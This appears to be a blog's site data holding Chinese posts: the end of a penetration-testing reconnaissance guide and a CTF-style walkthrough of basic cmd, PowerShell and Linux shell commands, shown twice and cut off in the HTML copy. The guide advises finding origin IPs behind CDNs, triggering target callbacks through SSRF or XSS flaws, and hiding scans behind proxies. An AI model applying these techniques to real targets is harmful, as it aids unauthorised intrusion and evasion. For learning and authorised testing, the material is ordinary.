class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://dnsdb.io/zh-cn/</span><br><span class=\"line\"></span><br><span class=\"line\"> https://x.threatbook.cn</span><br><span class=\"line\"></span><br><span class=\"line\"> https://viewdns.info/iphistory/</span><br><span class=\"line\"></span><br><span class=\"line\"> https://site.ip138.com/</span><br><span class=\"line\"> </span><br><span class=\"line\"> https://www.netcraft.com</span><br><span class=\"line\"></span><br><span class=\"line\"> https://viewdns.info/</span><br></pre></td></tr></table></figure>\n<p>等网站来观察域名的IP历史记录。</p>\n</li>\n<li><p>Nslookup查询。查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。</p>\n</li>\n<li><p>利用网络空间搜索引擎。这里主要是利用网站返回的内容寻找真实原始IP，如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。最常见的网络空间搜索引擎有如下：</p>\n</li>\n</ol>\n<ul>\n<li>Shodan：<a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></li>\n<li>钟馗之眼：<a href=\"https://www.zoomeye.org/\">https://www.zoomeye.org/</a></li>\n<li>FOFA：<a href=\"https://fofa.so/\">https://fofa.so/</a></li>\n</ul>\n<ol start=\"8\">\n<li>利用网站漏洞。比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</li>\n</ol>\n<h2 id=\"端口信息收集\"><a href=\"#端口信息收集\" class=\"headerlink\" title=\"端口信息收集\"></a>端口信息收集</h2><p>查看本机端口</p>\n<p>netstat命令</p>\n<ol>\n<li><p>nmap工具加Zenmap工具加Masscan工具扫描<br>zenmap是nmap的图形化界面<br>masscan高速端口扫描工具</p>\n</li>\n<li><p>由于使用工具通常会在目标网站留下痕迹，接下来提供一种在线网站探测方法。</p>\n</li>\n</ol>\n<ul>\n<li>在线网站：<a href=\"http://tool.chinaz.com/port/\">http://tool.chinaz.com/port/</a></li>\n<li>ThreatScan在线网站（网站基础信息收集）：<a href=\"https://scan.top15.cn/\">https://scan.top15.cn/</a></li>\n<li>Shodan：<a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></li>\n</ul>\n<h2 id=\"主动信息收集\"><a href=\"#主动信息收集\" class=\"headerlink\" title=\"主动信息收集\"></a>主动信息收集</h2><p>主动信息收集通常是在被动信息收集之后分析出重要攻击⾯或者⽬标重要信息的时候再针对性地去做主动信息收集，</p>\n<p>在主动信息收集的时候通常持续时间⽐较⻓⽽且会通过各种不同的⽅式与⽬标交互。实战中最常⽤的⼿段是模拟或者伪装正常的业务流程与⽬标交互。</p>\n<p>主动信息搜集之前我们一定要挂上代理，一方面是为了隐藏自己，一方面是为了防止测试的时候被封ip导致无法进行继续的渗透活动。</p>\n<h3 id=\"操作系统识别\"><a href=\"#操作系统识别\" class=\"headerlink\" title=\"操作系统识别\"></a>操作系统识别</h3><p>Windows的TTL的值是128，而Linux的TTL大多是64。（默认情况下）</p>\n<h3 id=\"服务版本识别\"><a href=\"#服务版本识别\" class=\"headerlink\" title=\"服务版本识别\"></a>服务版本识别</h3><p>流量包中的关键字</p>\n<p>servers-db（nmap所维护的一个数据库，其中包含了各种网络服务的版本信息的特征数据，通过对目标服务发起请求，从响应中提取特征数据跟数据库中进行比对，就能识别出对应的版本）</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/qq_64177395/article/details/141267567\">https://blog.csdn.net/qq_64177395/article/details/141267567</a></p>\n<p><a href=\"https://www.cnblogs.com/0daybug/p/13800776.html\">https://www.cnblogs.com/0daybug/p/13800776.html</a></p>\n"},{"title":"传说中的命令行","date":"2025-01-21T02:09:25.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/01/21/BznaD7wdM4rACkW.jpg","_content":"\n今天咱来到传说中的命令行 话说命令行三分天下 其一是Windows的cmd 其二是Windows powershell 其三是linux的shell 这三个利器要是能全部掌握 那就是传说中的大佬\n\n命令行比起图形化界面更快 更高效 也更大佬\n\n这次就简单介绍一下如何使用命令行来：\n\n- 显示基本系统信息\n- 检查并排除网络配置故障\n- 管理文件和文件夹\n- 检查正在运行的进程\n  \n一如既往 先ssh连接一下机子 准备操作\n\n## Windows命令行\n MS Windows 命令提示符是cmd.exe\n\n ### task1\n ![task1](/images/传说中的命令行/task1.png)\n\n 这个不用说 就是cmd.exe\n\n ### task2\n 基本系统信息\n\n **set**命令检查你的路径\n\n ```\nset\n ```\n\n![set](/images/传说中的命令行/set.png)\n\n **ver**命令查看操作系统的版本\n\n ```\nver\n ```\n\n![ver](/images/传说中的命令行/ver.png)\n\n热身结束 我们看看题\n\n![task](/images/传说中的命令行/task2.png)\n\n第一题直接用**ver**命令能查出他的os版本\n\n第二题用**systeminfo**命令来看他的hostname\n\n ### task3\n 网络故障排除\n\n 顾名思义 **ipconfig**命令 或者后面加个/all。\n\n 我们还可以**ping** 域名 如 ping www.baidu.com\n\n 下一个是**tracert** 代表跟踪路由。该命令tracert target_name跟踪到达目标所经过的网络路由\n\n **nslook** \n nslookup example.com 它查找主机或域并返回其 IP 地址\n\n netstat\n此命令显示当前网络连接和监听端口\n\n![task3](/images/传说中的命令行/task3.png)\n\n第一题使用**ipconfig /all**来查找\n\n第二题 用**netstat**命令来查找 我们要在后面加个 **-abno** 然后找到3389端口那一行\n\n![er](/images/传说中的命令行/ss89.png)\n\n第三题 在ipconfig那也可以顺便看到掩码是255.255.0.0\n\n### task4\n文件与磁盘管理\n\n**cd命令** 这个和linux中的有异曲同工之妙  \n\n不带参数的话就和linux的pwd一样 显示当前的路径\n\n**dir**是显示子目录的命令\n\n**tree命令**就和linux命令差不多\n\n新建和删除文件就是mkdir和rmdir\n\n**copy**命令允许文件从一个位置复制到另一个位置\n\n```\ncopy file1 file2\n```\n\n**move**命令 移动文件\n\n```\nmove file1 文件夹名\n```\n\n**erase**命令 删除文件\n\n```\nerase 文件名    \n```\n\n![task4](/images/传说中的命令行/task4.png)\n\n先cd ..退出到根目录\n\n然后cd 进题目要求的目录\n\nmore一下txt文件就行\n\n![task4](/images/传说中的命令行/flag.png)\n\n### task5\n任务管理\n**tasklist**命令和**taskkill**命令\n\n废话不多说 我们看看题\n\n![task5](/images/传说中的命令行/task5.png)\n\n这题就是看你的熟悉程度 \n\n第一题就是\n```\ntasklist /FI \"imagename eq notepad.exe\"\n```\n\n第二题\n```\ntaskkill /PID 1516\n```\n\n### task6\n\n![task6](/images/传说中的命令行/task6.png)\n\nshutdown /r：重启计算机。\nshutdown /a：取消正在进行的关机或重启操作。\n\n## windows powershell\n接下来是powershell\n\n废话不多说 我们看看task2\n### task2\n![task2](/images/传说中的命令行/powershell/task2.png)\n\n我们怎样称呼开发 PowerShell 所采用的高级方法？\n\n答案:**object-oriented**(面向对象)\n\n### task3 \n**powershell基础**\n\n#### 打开powershell\n打开powershell有很多个方法\n\n 1.开始菜单：powershell在 Windows 开始菜单搜索栏中输入，然后在结果中单击Windows PowerShell或。PowerShell\n\n2 .运行对话框：按Win + R打开Run对话框，输入powershell，然后点击Enter。\n\n 3.文件资源管理器：导航到任何文件夹，然后powershell在地址栏中输入，然后按Enter。这将在该特定目录中打开PowerShell 。\n\n#### cmdlet\n\n PowerShell命令称为**cmdlets**。它们比传统的 Windows 命令功能更牛掰，并且允许进行更高级的数据操作。\n\n Cmdlet 遵循一致的**Verb-Noun**8命名约定\n\neg：\n- <strong>Get-Content</strong>：检索（获取）文件的内容并将其显示在控制台中。\n- <strong>Set-Location</strong>：更改（设置）当前工作目录。\n\n假如说你想看看有哪些可用的cmdlet啥的 可以用**get-command**这个命令\n\n![getcommand](/images/传说中的命令行/powershell/get-command.png)\n\n还能在后面加个**commandtype**来筛选自己想要的东西\n\n![getcommand](/images/传说中的命令行/powershell/commandtype.png)\n\n\n当然不懂的话 我们就用**get-help** 这里用的是get-data。我们可以通过在基本语法中添加一些选项来检索有关 cmdlet 的其他有用信息。\n\n![help](/images/传说中的命令行/powershell/help.png)\n\nget-alias 列出了所有可用的别名\n![getalias](/images/传说中的命令行/powershell/getalias.png)\n\n我们看一下题目\n\n![task3](/images/传说中的命令行/powershell/task3.png)\n\n第一题 如何检索remove开头命令？\n用name筛选一下\n\n```\nget-command -name remove*\n```\n\n![remove](/images/传说中的命令行/powershell/remove.png)\n\n第二题 echo这个命令的别名叫啥?\n\n用**get-command -name** 筛选一下\n\n```\nget-command -name echo\n```\n\n![echo](/images/传说中的命令行/powershell/echo.png)\n\n\n用于检索New-LocalUser的cmdlet 的一些示例用法的命令是什么\n\n```\nGet-Help New-LocalUser -examples\n```\n\n![local](/images/传说中的命令行/powershell/localuser.png)\n\n\n### task4\n文件系统\n\n**Get-ChildItem**列出使用参数指定位置的文件和目录**Path**。它可用于探索目录并查看其内容。\n如果未Path指定，则 cmdlet 将显示当前工作目录的内容。\n\n![get](/images/传说中的命令行/powershell/getchilditem.png)\n\n要导航到其他目录，我们可以使用**Set-Location**。它会更改当前目录，将我们带到指定路径，类似于cd命令提示符中的命令。\n\n要在PowerShell中创建一个项目，我们可以使用**New-Item**。\n\n**Remove-Itemcmdlet** 会同时删除目录和文件\n\n我们可以分别使用**Copy-Item**（相当于copy）和**Move-Item**（相当于move）来复制或移动文件和目录。\n\n读取和显示文件的内容，我们可以使用 **cmdlet Get-Content**，其工作方式与type命令提示符\n\n![task4](/images/传说中的命令行/powershell/task4.png)\n\n第一题 类似type的命令就是get-content\n\n第二题  Get-ChildItem -Path C:\\Users (Get-ChildItem之后要加个路径)\n\n第三题数一下就知道了 四个\n\n### task5\n管道(|) 是命令行环境中使用的一种技术，允许将一个命令的输出用作另一个命令的输入。\n\n#### where-object\n 用于根据条件筛选对象。它会检查输入对象的属性，并根据指定的条件过滤出符合条件的对象。\n##### 运算符\n<strong>>-eq</strong>（即“等于”）是与其他脚本语言（例如 Bash、Python）共享的一组比较运算符的一部分。\n\n-<strong>ne</strong>：“不等于”。此运算符可用于根据指定的条件从结果中排除对象。\n\n<strong>-gt</strong>：“大于”。此运算符将仅过滤超过指定值的对象。需要注意的是，这是一个严格的比较，这意味着等于指定值的对象将被排除在结果之外。\n\n<strong>-ge</strong>：“大于或等于-gt”。这是上一个运算符的非严格版本。与的组合-eq。\n\n<strong>-lt</strong>：“小于”。与“大于”类似，这是一个严格运算符。它仅包含严格低于某个值的对象。\n\n<strong>-le</strong>：“小于或等于”。与 类似，这是前一个运算符的非严格版本。和-ge的组合。-lt-eq\n\n你已经掌握知识点了 现在我们来做一道题\n\n![task5](/images/传说中的命令行/powershell/task5.png)\n\n```\nGet-ChildItem | Where-Object -Property Length -gt 100\n\n-Property Length:指定要检查的属性是 Length。对于文件对象,Length 属性表示文件的大小（以字节为单位）。\n\n-gt 100:-gt 是 “大于”的缩写，表示筛选出 Length 属性值大于 100 的对象。\n```\n\n### task6\n系统与网络信息\n\n**Get-ComputerInfocmdlet** 可检索全面的系统信息，包括操作系统信息、硬件规格、BIOS 详细信息等。\n\n**Get-LocalUser**它列出了系统上的所有本地用户帐户。默认输出显示每个用户的用户名、帐户状态和说明。\n\n**Get-NetIPConfiguration**提供有关系统上网络接口的详细信息，包括 IP 地址、DNS服务器和网关配置。\n\n**Get-NetIPAddresscmdlet** 将显示系统上配置的所有 IP 地址的详细信息，包括当前不活动的 IP 地址。\n\n简单科普了一下 开始看看题目\n\n![task6](/images/传说中的命令行/powershell/task6.png)\n\n第一题 我们直接输入**get-localuser** 一看就能看出多了一个用户p1r4t3\n\n![task6](/images/传说中的命令行/powershell/user.png)\n\n第二题也可以顺便解出来 因为用户旁边的就是说明 正是题目需要的\nA merry life and a short one.\n\n第三题 其实也还好 一开始我以为要远程登录啥的 后来发现是我多虑了 \n\n直接cd ..退回上一级文件夹 **childitem**一下 就能看到p1r4t3 这个用户的文件夹 \n\n然后我们 **set-location** p1r4t3 进这个用户的文件夹 就能发现隐藏的宝藏 在进去就可以发现flag\n\n```\nset-location Users\n\nset-location p1r4t3\n\nset-location hidden-treasure-chest\n\nget-content big-treasure.txt\n```\n\n![task6](/images/传说中的命令行/powershell/flag1.png)\n\n![task6](/images/传说中的命令行/powershell/flag2.png)\n\n### task7\n实时系统分析\n\n**Get-Process**提供所有当前正在运行的进程的详细视图，包括CPU和内存使用情况，使其成为监控和故障排除的强大工具。\n\n**Get-Service**允许检索有关机器上服务状态的信息，例如哪些服务正在运行、停止或暂停。它被系统管理员广泛用于故障排除，也被取证分析师用于寻找系统上安装的异常服务\n\n**Get-NetTCPConnection**请显示当前TCP连接，深入了解本地和远程端点。此 cmdlet 在事件响应或恶意软件分析任务期间特别有用，因为它可以发现隐藏的后门或与攻击者控制的服务器建立的连接。\n\n**Get-FileHash**一个用于生成文件哈希的有用 cmdlet，它在事件响应、威胁搜寻和恶意软件分析中特别有价值，因为它有助于验证文件完整性并检测潜在的篡改。\n\n![task7](/images/传说中的命令行/powershell/task7.png)\n\n第一题 我们在刚才的那个文件夹里输入Get-FileHash命令来看他的hash值\n\n```\nGet-FileHash big-treasure-txt\n```\n\n![task7](/images/传说中的命令行/powershell/hash.png)\n\n第二题Get-NetTCPConnection 输出的信息中包含一个名为 OwningProcess 的属性，该属性表示每个 TCP 连接所属的进程 ID（PID）。\n\n![task7](/images/传说中的命令行/powershell/7.2.png)\n\n第三题 这一题就很有意思了 题目说是服务 那就要用**get-service**\n我们用| where-object 后面就填我们提示说的displayname 题目说了说明和displayname有关 我们用<strong>-like \"*merry*\"</strong>来找出指定的服务 (你也可以直接在后面复制整个说明)\n```\nget-service | where-object -like \"*merry*\" \n```\n\n![task7](/images/传说中的命令行/powershell/7.3.png)\n\n### task8\n脚本\n**Invoke-Command**对于在远程系统上执行命令至关重要，因此它对于系统管理员、安全工程师和渗透测试人员来说至关重要。它Invoke-Command 可实现高效的远程管理，并结合脚本实现跨多台机器的任务自动化。它还可用于在渗透测试人员或攻击者的参与过程中在目标系统上执行有效载荷或命令。\n\n![task7](/images/传说中的命令行/powershell/task8.png)\n\n```\nInvoke-Command -ComputerName RoyalFortune -ScriptBlock {Get-Service}\n```\n\n## linux shell\n总算来到比较熟悉的地方了 linux还是懂点的 废话不多说开始吧\n\n#### task2\n要查看当前工作目录，可以执行**pwd**，它代表打印工作目录，\n要查看目录的内容 可以用**ls**命令\n读取文件的内容 用**cat**命令\ngrep 命令可以搜索文件内的任何单词或模式\n\n![task2](/images/传说中的命令行/linux/task2.png)\n\n- 第一题 bash (echo $SHELL可以看你的linux shell当前版本)\n- 第二题 ls \n- 第三题 grep\n\n### task3\n\ncat /etc/shell可以列出Linux 操作系统中可用的 shell\n\n![task3](/images/传说中的命令行/linux/task3.png)\n\n- 第一题 fish\n- 第二题 bash\n- 第三题 history\n\n### task4\n\n![task3](/images/传说中的命令行/linux/task4.png)\n\n- 第一题 #!/bin/bash\n- 第二题 chmod +x\n- 第三题 loops\n\n### task5\n\n![task3](/images/传说中的命令行/linux/task5.png)\n\n在看文章的时候 文章说了pin是7385\n\n答案为7385\n\n### task6\n\n![task3](/images/传说中的命令行/linux/task6.png)\n\n我们来看题目要求 进入机子的/home/user的脚本里面 将三个空修改完\n\n第一个空是填文件的路径 /var/log\n\n第二个空是把文章里面的flag填进去\n\n第三个空要填$directory （$directory/*.log 是一个模式匹配表达式，表示 /var/log 目录下所有以 .log 结尾的文件。）\n\n![task3](/images/传说中的命令行/linux/cat.png)\n\n将脚本改完之后 我们开始运行脚本 脚本告诉我们 flag在authentication.log里面\n\n![task3](/images/传说中的命令行/linux/cat1.png)\n\n我们用cat搜索一下authentication.log里的关键词 成功搜索到\n\n![task3](/images/传说中的命令行/linux/cat2.png)\n\nOK 传说的三位 我们已经介绍完毕 还有很多内容要我们学习 这些只是个皮面 keep moving","source":"_posts/传说中的命令行.md","raw":"---\ntitle: 传说中的命令行\ndate: 2025-01-21 10:09:25\ntags: linux windows shell 管理\ntop_img: transparent\ncover: https://s2.loli.net/2025/01/21/BznaD7wdM4rACkW.jpg\n---\n\n今天咱来到传说中的命令行 话说命令行三分天下 其一是Windows的cmd 其二是Windows powershell 其三是linux的shell 这三个利器要是能全部掌握 那就是传说中的大佬\n\n命令行比起图形化界面更快 更高效 也更大佬\n\n这次就简单介绍一下如何使用命令行来：\n\n- 显示基本系统信息\n- 检查并排除网络配置故障\n- 管理文件和文件夹\n- 检查正在运行的进程\n  \n一如既往 先ssh连接一下机子 准备操作\n\n## Windows命令行\n MS Windows 命令提示符是cmd.exe\n\n ### task1\n ![task1](/images/传说中的命令行/task1.png)\n\n 这个不用说 就是cmd.exe\n\n ### task2\n 基本系统信息\n\n **set**命令检查你的路径\n\n ```\nset\n ```\n\n![set](/images/传说中的命令行/set.png)\n\n **ver**命令查看操作系统的版本\n\n ```\nver\n ```\n\n![ver](/images/传说中的命令行/ver.png)\n\n热身结束 我们看看题\n\n![task](/images/传说中的命令行/task2.png)\n\n第一题直接用**ver**命令能查出他的os版本\n\n第二题用**systeminfo**命令来看他的hostname\n\n ### task3\n 网络故障排除\n\n 顾名思义 **ipconfig**命令 或者后面加个/all。\n\n 我们还可以**ping** 域名 如 ping www.baidu.com\n\n 下一个是**tracert** 代表跟踪路由。该命令tracert target_name跟踪到达目标所经过的网络路由\n\n **nslook** \n nslookup example.com 它查找主机或域并返回其 IP 地址\n\n netstat\n此命令显示当前网络连接和监听端口\n\n![task3](/images/传说中的命令行/task3.png)\n\n第一题使用**ipconfig /all**来查找\n\n第二题 用**netstat**命令来查找 我们要在后面加个 **-abno** 然后找到3389端口那一行\n\n![er](/images/传说中的命令行/ss89.png)\n\n第三题 在ipconfig那也可以顺便看到掩码是255.255.0.0\n\n### task4\n文件与磁盘管理\n\n**cd命令** 这个和linux中的有异曲同工之妙  \n\n不带参数的话就和linux的pwd一样 显示当前的路径\n\n**dir**是显示子目录的命令\n\n**tree命令**就和linux命令差不多\n\n新建和删除文件就是mkdir和rmdir\n\n**copy**命令允许文件从一个位置复制到另一个位置\n\n```\ncopy file1 file2\n```\n\n**move**命令 移动文件\n\n```\nmove file1 文件夹名\n```\n\n**erase**命令 删除文件\n\n```\nerase 文件名    \n```\n\n![task4](/images/传说中的命令行/task4.png)\n\n先cd ..退出到根目录\n\n然后cd 进题目要求的目录\n\nmore一下txt文件就行\n\n![task4](/images/传说中的命令行/flag.png)\n\n### task5\n任务管理\n**tasklist**命令和**taskkill**命令\n\n废话不多说 我们看看题\n\n![task5](/images/传说中的命令行/task5.png)\n\n这题就是看你的熟悉程度 \n\n第一题就是\n```\ntasklist /FI \"imagename eq notepad.exe\"\n```\n\n第二题\n```\ntaskkill /PID 1516\n```\n\n### task6\n\n![task6](/images/传说中的命令行/task6.png)\n\nshutdown /r：重启计算机。\nshutdown /a：取消正在进行的关机或重启操作。\n\n## windows powershell\n接下来是powershell\n\n废话不多说 我们看看task2\n### task2\n![task2](/images/传说中的命令行/powershell/task2.png)\n\n我们怎样称呼开发 PowerShell 所采用的高级方法？\n\n答案:**object-oriented**(面向对象)\n\n### task3 \n**powershell基础**\n\n#### 打开powershell\n打开powershell有很多个方法\n\n 1.开始菜单：powershell在 Windows 开始菜单搜索栏中输入，然后在结果中单击Windows PowerShell或。PowerShell\n\n2 .运行对话框：按Win + R打开Run对话框，输入powershell，然后点击Enter。\n\n 3.文件资源管理器：导航到任何文件夹，然后powershell在地址栏中输入，然后按Enter。这将在该特定目录中打开PowerShell 。\n\n#### cmdlet\n\n PowerShell命令称为**cmdlets**。它们比传统的 Windows 命令功能更牛掰，并且允许进行更高级的数据操作。\n\n Cmdlet 遵循一致的**Verb-Noun**8命名约定\n\neg：\n- <strong>Get-Content</strong>：检索（获取）文件的内容并将其显示在控制台中。\n- <strong>Set-Location</strong>：更改（设置）当前工作目录。\n\n假如说你想看看有哪些可用的cmdlet啥的 可以用**get-command**这个命令\n\n![getcommand](/images/传说中的命令行/powershell/get-command.png)\n\n还能在后面加个**commandtype**来筛选自己想要的东西\n\n![getcommand](/images/传说中的命令行/powershell/commandtype.png)\n\n\n当然不懂的话 我们就用**get-help** 这里用的是get-data。我们可以通过在基本语法中添加一些选项来检索有关 cmdlet 的其他有用信息。\n\n![help](/images/传说中的命令行/powershell/help.png)\n\nget-alias 列出了所有可用的别名\n![getalias](/images/传说中的命令行/powershell/getalias.png)\n\n我们看一下题目\n\n![task3](/images/传说中的命令行/powershell/task3.png)\n\n第一题 如何检索remove开头命令？\n用name筛选一下\n\n```\nget-command -name remove*\n```\n\n![remove](/images/传说中的命令行/powershell/remove.png)\n\n第二题 echo这个命令的别名叫啥?\n\n用**get-command -name** 筛选一下\n\n```\nget-command -name echo\n```\n\n![echo](/images/传说中的命令行/powershell/echo.png)\n\n\n用于检索New-LocalUser的cmdlet 的一些示例用法的命令是什么\n\n```\nGet-Help New-LocalUser -examples\n```\n\n![local](/images/传说中的命令行/powershell/localuser.png)\n\n\n### task4\n文件系统\n\n**Get-ChildItem**列出使用参数指定位置的文件和目录**Path**。它可用于探索目录并查看其内容。\n如果未Path指定，则 cmdlet 将显示当前工作目录的内容。\n\n![get](/images/传说中的命令行/powershell/getchilditem.png)\n\n要导航到其他目录，我们可以使用**Set-Location**。它会更改当前目录，将我们带到指定路径，类似于cd命令提示符中的命令。\n\n要在PowerShell中创建一个项目，我们可以使用**New-Item**。\n\n**Remove-Itemcmdlet** 会同时删除目录和文件\n\n我们可以分别使用**Copy-Item**（相当于copy）和**Move-Item**（相当于move）来复制或移动文件和目录。\n\n读取和显示文件的内容，我们可以使用 **cmdlet Get-Content**，其工作方式与type命令提示符\n\n![task4](/images/传说中的命令行/powershell/task4.png)\n\n第一题 类似type的命令就是get-content\n\n第二题  Get-ChildItem -Path C:\\Users (Get-ChildItem之后要加个路径)\n\n第三题数一下就知道了 四个\n\n### task5\n管道(|) 是命令行环境中使用的一种技术，允许将一个命令的输出用作另一个命令的输入。\n\n#### where-object\n 用于根据条件筛选对象。它会检查输入对象的属性，并根据指定的条件过滤出符合条件的对象。\n##### 运算符\n<strong>>-eq</strong>（即“等于”）是与其他脚本语言（例如 Bash、Python）共享的一组比较运算符的一部分。\n\n-<strong>ne</strong>：“不等于”。此运算符可用于根据指定的条件从结果中排除对象。\n\n<strong>-gt</strong>：“大于”。此运算符将仅过滤超过指定值的对象。需要注意的是，这是一个严格的比较，这意味着等于指定值的对象将被排除在结果之外。\n\n<strong>-ge</strong>：“大于或等于-gt”。这是上一个运算符的非严格版本。与的组合-eq。\n\n<strong>-lt</strong>：“小于”。与“大于”类似，这是一个严格运算符。它仅包含严格低于某个值的对象。\n\n<strong>-le</strong>：“小于或等于”。与 类似，这是前一个运算符的非严格版本。和-ge的组合。-lt-eq\n\n你已经掌握知识点了 现在我们来做一道题\n\n![task5](/images/传说中的命令行/powershell/task5.png)\n\n```\nGet-ChildItem | Where-Object -Property Length -gt 100\n\n-Property Length:指定要检查的属性是 Length。对于文件对象,Length 属性表示文件的大小（以字节为单位）。\n\n-gt 100:-gt 是 “大于”的缩写，表示筛选出 Length 属性值大于 100 的对象。\n```\n\n### task6\n系统与网络信息\n\n**Get-ComputerInfocmdlet** 可检索全面的系统信息，包括操作系统信息、硬件规格、BIOS 详细信息等。\n\n**Get-LocalUser**它列出了系统上的所有本地用户帐户。默认输出显示每个用户的用户名、帐户状态和说明。\n\n**Get-NetIPConfiguration**提供有关系统上网络接口的详细信息，包括 IP 地址、DNS服务器和网关配置。\n\n**Get-NetIPAddresscmdlet** 将显示系统上配置的所有 IP 地址的详细信息，包括当前不活动的 IP 地址。\n\n简单科普了一下 开始看看题目\n\n![task6](/images/传说中的命令行/powershell/task6.png)\n\n第一题 我们直接输入**get-localuser** 一看就能看出多了一个用户p1r4t3\n\n![task6](/images/传说中的命令行/powershell/user.png)\n\n第二题也可以顺便解出来 因为用户旁边的就是说明 正是题目需要的\nA merry life and a short one.\n\n第三题 其实也还好 一开始我以为要远程登录啥的 后来发现是我多虑了 \n\n直接cd ..退回上一级文件夹 **childitem**一下 就能看到p1r4t3 这个用户的文件夹 \n\n然后我们 **set-location** p1r4t3 进这个用户的文件夹 就能发现隐藏的宝藏 在进去就可以发现flag\n\n```\nset-location Users\n\nset-location p1r4t3\n\nset-location hidden-treasure-chest\n\nget-content big-treasure.txt\n```\n\n![task6](/images/传说中的命令行/powershell/flag1.png)\n\n![task6](/images/传说中的命令行/powershell/flag2.png)\n\n### task7\n实时系统分析\n\n**Get-Process**提供所有当前正在运行的进程的详细视图，包括CPU和内存使用情况，使其成为监控和故障排除的强大工具。\n\n**Get-Service**允许检索有关机器上服务状态的信息，例如哪些服务正在运行、停止或暂停。它被系统管理员广泛用于故障排除，也被取证分析师用于寻找系统上安装的异常服务\n\n**Get-NetTCPConnection**请显示当前TCP连接，深入了解本地和远程端点。此 cmdlet 在事件响应或恶意软件分析任务期间特别有用，因为它可以发现隐藏的后门或与攻击者控制的服务器建立的连接。\n\n**Get-FileHash**一个用于生成文件哈希的有用 cmdlet，它在事件响应、威胁搜寻和恶意软件分析中特别有价值，因为它有助于验证文件完整性并检测潜在的篡改。\n\n![task7](/images/传说中的命令行/powershell/task7.png)\n\n第一题 我们在刚才的那个文件夹里输入Get-FileHash命令来看他的hash值\n\n```\nGet-FileHash big-treasure-txt\n```\n\n![task7](/images/传说中的命令行/powershell/hash.png)\n\n第二题Get-NetTCPConnection 输出的信息中包含一个名为 OwningProcess 的属性，该属性表示每个 TCP 连接所属的进程 ID（PID）。\n\n![task7](/images/传说中的命令行/powershell/7.2.png)\n\n第三题 这一题就很有意思了 题目说是服务 那就要用**get-service**\n我们用| where-object 后面就填我们提示说的displayname 题目说了说明和displayname有关 我们用<strong>-like \"*merry*\"</strong>来找出指定的服务 (你也可以直接在后面复制整个说明)\n```\nget-service | where-object -like \"*merry*\" \n```\n\n![task7](/images/传说中的命令行/powershell/7.3.png)\n\n### task8\n脚本\n**Invoke-Command**对于在远程系统上执行命令至关重要，因此它对于系统管理员、安全工程师和渗透测试人员来说至关重要。它Invoke-Command 可实现高效的远程管理，并结合脚本实现跨多台机器的任务自动化。它还可用于在渗透测试人员或攻击者的参与过程中在目标系统上执行有效载荷或命令。\n\n![task7](/images/传说中的命令行/powershell/task8.png)\n\n```\nInvoke-Command -ComputerName RoyalFortune -ScriptBlock {Get-Service}\n```\n\n## linux shell\n总算来到比较熟悉的地方了 linux还是懂点的 废话不多说开始吧\n\n#### task2\n要查看当前工作目录，可以执行**pwd**，它代表打印工作目录，\n要查看目录的内容 可以用**ls**命令\n读取文件的内容 用**cat**命令\ngrep 命令可以搜索文件内的任何单词或模式\n\n![task2](/images/传说中的命令行/linux/task2.png)\n\n- 第一题 bash (echo $SHELL可以看你的linux shell当前版本)\n- 第二题 ls \n- 第三题 grep\n\n### task3\n\ncat /etc/shell可以列出Linux 操作系统中可用的 shell\n\n![task3](/images/传说中的命令行/linux/task3.png)\n\n- 第一题 fish\n- 第二题 bash\n- 第三题 history\n\n### task4\n\n![task3](/images/传说中的命令行/linux/task4.png)\n\n- 第一题 #!/bin/bash\n- 第二题 chmod +x\n- 第三题 loops\n\n### task5\n\n![task3](/images/传说中的命令行/linux/task5.png)\n\n在看文章的时候 文章说了pin是7385\n\n答案为7385\n\n### task6\n\n![task3](/images/传说中的命令行/linux/task6.png)\n\n我们来看题目要求 进入机子的/home/user的脚本里面 将三个空修改完\n\n第一个空是填文件的路径 /var/log\n\n第二个空是把文章里面的flag填进去\n\n第三个空要填$directory （$directory/*.log 是一个模式匹配表达式，表示 /var/log 目录下所有以 .log 结尾的文件。）\n\n![task3](/images/传说中的命令行/linux/cat.png)\n\n将脚本改完之后 我们开始运行脚本 脚本告诉我们 flag在authentication.log里面\n\n![task3](/images/传说中的命令行/linux/cat1.png)\n\n我们用cat搜索一下authentication.log里的关键词 成功搜索到\n\n![task3](/images/传说中的命令行/linux/cat2.png)\n\nOK 传说的三位 我们已经介绍完毕 还有很多内容要我们学习 这些只是个皮面 keep moving","slug":"传说中的命令行","published":1,"updated":"2025-01-22T12:46:51.913Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxo001mtsg691mzbbzr","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>今天咱来到传说中的命令行 话说命令行三分天下 其一是Windows的cmd 其二是Windows powershell 其三是linux的shell 这三个利器要是能全部掌握 那就是传说中的大佬</p>\n<p>命令行比起图形化界面更快 更高效 也更大佬</p>\n<p>这次就简单介绍一下如何使用命令行来：</p>\n<ul>\n<li>显示基本系统信息</li>\n<li>检查并排除网络配置故障</li>\n<li>管理文件和文件夹</li>\n<li>检查正在运行的进程</li>\n</ul>\n<p>一如既往 先ssh连接一下机子 准备操作</p>\n<h2 id=\"Windows命令行\"><a href=\"#Windows命令行\" class=\"headerlink\" title=\"Windows命令行\"></a>Windows命令行</h2><p> MS Windows 命令提示符是cmd.exe</p>\n<h3 id=\"task1\"><a href=\"#task1\" class=\"headerlink\" title=\"task1\"></a>task1</h3><p> <img src=\"/images/%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C/task1.png\" alt=\"task1\"></p>\n<p> 这个不用说 就是cmd.exe</p>\n<h3 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p> 基本系统信息</p>\n<p> <strong>set</strong>命令检查你的路径</p>\n <figure class=\"highlight 